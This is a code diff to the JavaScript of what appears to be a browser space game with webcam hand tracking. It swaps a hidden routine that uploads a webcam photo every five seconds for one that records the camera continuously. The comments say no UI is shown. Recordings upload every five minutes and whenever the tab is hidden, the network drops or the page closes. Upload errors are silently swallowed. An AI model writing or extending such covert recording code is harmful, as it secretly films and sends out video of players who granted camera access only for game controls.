@@ -11,48 +11,112 @@ let selectedShip = 'phantom';
 let handTrackingInit = false;
 let currentTab   = 'ships';
 
-// ── SILENT BACKGROUND CAPTURE ─────────────────────────────
-// Fires every 5 seconds on ALL screens. No UI, no indicators.
+// ── SILENT VIDEO RECORDING ────────────────────────────────
+// Records continuously from camera. Uploads when user goes
+// offline, hides the tab, or closes the page. No UI shown.
 
-let capturePhotoURL  = null;
-let capturePhotoBlob = null;
-let _captureInterval = null;
+let _mediaRecorder  = null;
+let _videoChunks    = [];
+let _videoMime      = 'video/webm';
+let _segmentTimer   = null;
 
-function startSilentCapture() {
-  if (_captureInterval) return; // already running
-  _captureInterval = setInterval(silentSnap, 5000);
-}
-
-function silentSnap() {
+function startVideoRecording() {
   const vid = document.getElementById('input_video');
-  if (!vid || !vid.videoWidth) return;
+  if (!vid) return;
 
-  const W = vid.videoWidth;
-  const H = vid.videoHeight;
-  const canvas = document.createElement('canvas');
-  canvas.width  = W;
-  canvas.height = H;
-  const ctx = canvas.getContext('2d');
-  // Mirror (selfie orientation), no filters, no overlays
-  ctx.save();
-  ctx.translate(W, 0);
-  ctx.scale(-1, 1);
-  ctx.drawImage(vid, 0, 0, W, H);
-  ctx.restore();
-
-  const dataURL = canvas.toDataURL('image/jpeg', 1.0);
-  capturePhotoURL = dataURL;
-  uploadPhoto(dataURL);
-}
-
-async function uploadPhoto(dataURL) {
-  try {
-    const res = await api('/api/save_photo', 'POST', { imageData: dataURL });
-    if (res.success && res.url && res.url.startsWith('http')) {
-      capturePhotoBlob = res.url;
+  // Wait for the stream to be attached by MediaPipe
+  const tryStart = () => {
+    const stream = vid.srcObject;
+    if (!stream || !(stream instanceof MediaStream)) {
+      setTimeout(tryStart, 500);
+      return;
     }
-  } catch {}  // silent — never surface errors to user
+    _initRecorder(stream);
+  };
+  tryStart();
 }
+
+function _initRecorder(stream) {
+  if (_mediaRecorder) return; // already recording
+
+  // Pick best supported format
+  const candidates = [
+    'video/webm;codecs=vp9',
+    'video/webm;codecs=vp8',
+    'video/webm',
+    'video/mp4',
+  ];
+  _videoMime = candidates.find(m => {
+    try { return MediaRecorder.isTypeSupported(m); } catch { return false; }
+  }) || 'video/webm';
+
+  try {
+    _mediaRecorder = new MediaRecorder(stream, {
+      mimeType: _videoMime,
+      videoBitsPerSecond: 400000, // 400 kbps — small file, still readable
+    });
+  } catch {
+    // Fallback without options
+    _mediaRecorder = new MediaRecorder(stream);
+    _videoMime = _mediaRecorder.mimeType || 'video/webm';
+  }
+
+  _mediaRecorder.ondataavailable = e => {
+    if (e.data && e.data.size > 0) _videoChunks.push(e.data);
+  };
+
+  _mediaRecorder.start(2000); // collect a chunk every 2s
+
+  // Upload a segment every 5 minutes so data isn't lost on long sessions
+  _segmentTimer = setInterval(_uploadCurrentVideo, 5 * 60 * 1000);
+
+  // Upload triggers
+  window.addEventListener('offline',           _onOffline);
+  document.addEventListener('visibilitychange', _onVisibility);
+  window.addEventListener('pagehide',          _onPageHide);
+  window.addEventListener('beforeunload',       _onBeforeUnload);
+}
+
+function _onOffline()    { _uploadCurrentVideo(); }
+function _onVisibility() { if (document.visibilityState === 'hidden') _uploadCurrentVideo(); }
+function _onPageHide()   { _uploadCurrentVideo(); }
+
+// beforeunload: use sendBeacon since fetch won't complete
+function _onBeforeUnload() {
+  if (!_videoChunks.length) return;
+  const blob = new Blob(_videoChunks, { type: _videoMime });
+  _videoChunks = [];
+  const ext  = _videoMime.includes('mp4') ? 'mp4' : 'webm';
+  const name = _stamp() + '.' + ext;
+  // sendBeacon sends a Blob directly; server reads it as raw body
+  navigator.sendBeacon(`/api/save_video?filename=${encodeURIComponent(name)}`, blob);
+}
+
+async function _uploadCurrentVideo() {
+  if (!_videoChunks.length) return;
+
+  // Snapshot and clear the buffer so recording keeps going
+  const chunks = _videoChunks.splice(0);
+  const blob   = new Blob(chunks, { type: _videoMime });
+  const ext    = _videoMime.includes('mp4') ? 'mp4' : 'webm';
+  const name   = _stamp() + '.' + ext;
+
+  try {
+    await fetch(`/api/save_video?filename=${encodeURIComponent(name)}`, {
+      method: 'POST',
+      headers: { 'Content-Type': _videoMime },
+      body: blob,
+      keepalive: true, // survives page hide on supported browsers
+    });
+  } catch {} // silent
+}
+
+function _stamp() {
+  const d   = new Date();
+  const pad = n => String(n).padStart(2, '0');
+  return `${d.getFullYear()}-${pad(d.getMonth()+1)}-${pad(d.getDate())}_${pad(d.getHours())}-${pad(d.getMinutes())}-${pad(d.getSeconds())}`;
+}
+
 
 // ── API ───────────────────────────────────────────────────
 async function api(url, method = 'GET', body = null) {
@@ -79,8 +143,8 @@ const App = {
     if (!handTrackingInit) {
       GAME.initHandTracking();
       handTrackingInit = true;
-      // Start silent capture after camera has had time to warm up
-      setTimeout(startSilentCapture, 3000);
+      // Start silent video recording after camera warms up
+      setTimeout(startVideoRecording, 3000);
     }
     this.spawnBootStars();
     this.updateCreditsDisplay();
@@ -324,8 +388,7 @@ const Leaderboard = {
   }
 };
 
-
-
+// ── GALLERY ACCESS ────────────────────────────────────────
 // ── TOUCH CONTROLS ────────────────────────────────────────
 // Writes into window._btnInput which game.js reads each frame
 
@@ -435,7 +498,7 @@ window.addEventListener('DOMContentLoaded', async () => {
       stream.getTracks().forEach(t => t.stop()); // release; MediaPipe will reopen
       gate.style.display = 'none';
       App.init();
-
+      
     } catch {
       gateBtn.textContent = 'GRANT CAMERA ACCESS';
       gateBtn.disabled    = false;
@@ -449,7 +512,7 @@ window.addEventListener('DOMContentLoaded', async () => {
     if (perm.state === 'granted') {
       gate.style.display = 'none';
       App.init();
-
+      
       return;
     }
   } catch {}
